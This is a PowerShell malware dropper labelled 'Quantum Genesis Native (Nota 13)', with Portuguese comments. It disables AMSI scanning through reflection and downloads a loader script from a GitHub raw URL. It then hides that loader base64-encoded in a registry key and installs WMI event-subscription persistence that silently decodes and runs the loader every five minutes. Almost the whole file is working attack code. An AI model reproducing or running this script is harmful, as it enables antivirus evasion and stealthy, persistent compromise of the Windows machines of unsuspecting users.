# --- QUANTUM GENESIS NATIVE (NOTA 13) ---
$ErrorActionPreference = "SilentlyContinue"

# 1. AMSI Bypass Inicial
$a=[Ref].Assembly.GetTypes()|Where-Object {$_.Name -like "*AmsiUtils*"}
$b=$a.GetFields('NonPublic,Static')|Where-Object {$_.Name -like "*amsiInitFailed*"}
$b.SetValue($null,$true)

# 2. Carregar o Loader Nativo
$loaderUrl = "https://raw.githubusercontent.com/kevinff1090-debug/kkvn/main/quantum_loader.ps1"
$loaderContent = (New-Object Net.WebClient).DownloadString($loaderUrl)

# 3. Persistência no Registro
$b64 = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($loaderContent))
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Debug"
if (!(Test-Path $regPath)) { New-Item $regPath -Force }
Set-ItemProperty -Path $regPath -Name "QE" -Value $b64

# 4. Configurar WMI Persistence
$wmiCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-ItemProperty '$regPath').QE)))`""

$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{
    Name = "QF"
    EventNamespace = "root\cimv2"
    QueryLanguage = "WQL"
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Minute % 5 = 0"
}

$consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{
    Name = "QC"
    CommandLineTemplate = $wmiCommand
}

Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{
    Filter = $filter
    Consumer = $consumer
}

Write-Host "SUCESSO: Nota 13 (Edição Nativa) ativada." -ForegroundColor Magenta
